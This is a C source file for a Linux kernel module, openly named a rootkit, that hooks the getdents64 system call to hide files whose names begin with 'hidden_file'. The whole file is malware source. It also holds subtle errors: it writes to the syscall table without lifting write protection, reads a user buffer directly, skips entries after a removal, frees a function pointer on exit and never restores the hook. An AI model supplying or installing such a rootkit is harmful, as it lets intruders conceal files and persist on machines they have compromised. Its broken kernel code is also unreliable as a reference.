#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/slab.h>

#define MAGIC_PREFIX "hidden_file"

static asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
    long ret = original_getdents64(fd, dirp, count);
    if (ret <= 0) return ret;

    struct linux_dirent64 *d = dirp;
    long offset = 0;

    while (offset < ret) {
        if (strncmp(d->d_name, MAGIC_PREFIX, strlen(MAGIC_PREFIX)) == 0) {
            memmove(d, (char *)d + d->d_reclen, ret - offset - d->d_reclen);
            ret -= d->d_reclen;
        }
        offset += d->d_reclen;
        d = (struct linux_dirent64 *)((char *)dirp + offset);
    }
    return ret;
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit Loaded\n");
    // Lookup syscall table dynamically to bypass kallsyms restrictions
    unsigned long *syscall_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) {
        printk(KERN_ERR "Could not find syscall table\n");
        return -1;
    }
    original_getdents64 = (void *)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit Unloaded\n");
    kfree(original_getdents64);  // Prevent memory leaks
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
